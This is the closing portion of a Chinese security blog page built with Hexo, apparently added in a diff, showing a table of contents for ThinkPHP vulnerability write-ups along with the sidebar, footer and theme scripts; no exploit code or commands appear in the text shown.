class="nav-link" href="#Poc-exp-6"><span class="nav-number">2.11.5.</span> <span class="nav-text">Poc&#x2F;exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP-Mysql-%E8%81%9A%E5%90%88%E5%87%BD%E6%95%B0%E7%9B%B8%E5%85%B3%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="nav-number">2.12.</span> <span class="nav-text">ThinkPHP Mysql 聚合函数相关方法注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-5"><span class="nav-number">2.12.1.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-11"><span class="nav-number">2.12.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%82%E8%80%83%EF%BC%9A-1"><span class="nav-number">2.12.3.</span> <span class="nav-text">漏洞分析参考：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%EF%BC%89-7"><span class="nav-number">2.12.4.</span> <span class="nav-text">漏洞复现（内网环境）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc-exp-7"><span class="nav-number">2.12.5.</span> <span class="nav-text">Poc&#x2F;exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ThinkPHP5%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.13.</span> <span class="nav-text">ThinkPHP5文件包含漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D-6"><span class="nav-number">2.13.1.</span> <span class="nav-text">漏洞介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC-12"><span class="nav-number">2.13.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%82%E8%80%83-4"><span class="nav-number">2.13.3.</span> <span class="nav-text">漏洞分析参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%EF%BC%89-8"><span class="nav-number">2.13.4.</span> <span class="nav-text">漏洞复现（内网环境）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Poc-exp-8"><span class="nav-number">2.13.5.</span> <span class="nav-text">Poc&#x2F;exp</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="NoahTie"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">NoahTie</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/noahtie" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;noahtie" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:noahtie@foxmail.com" title="E-Mail → mailto:noahtie@foxmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://wpa.qq.com/msgrd?v=3&uin=571364304&site=qq&menu=yes" title="QQ → http:&#x2F;&#x2F;wpa.qq.com&#x2F;msgrd?v&#x3D;3&amp;uin&#x3D;571364304&amp;site&#x3D;qq&amp;menu&#x3D;yes" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>QQ</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top" rel="noopener" target="_blank">Reverier's Blog</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">NoahTie</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'Cd1LV9Hip0zo9XBt7rBn6Yqs-MdYXbMMI',
+      appKey     : 'yM4hszYa7RMP9zzL3C0t41P1',
+      placeholder: "Just go go",
+      avatar     : 'monsterid',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":true,"scale":0.25}});</script></body>
+</html>
+
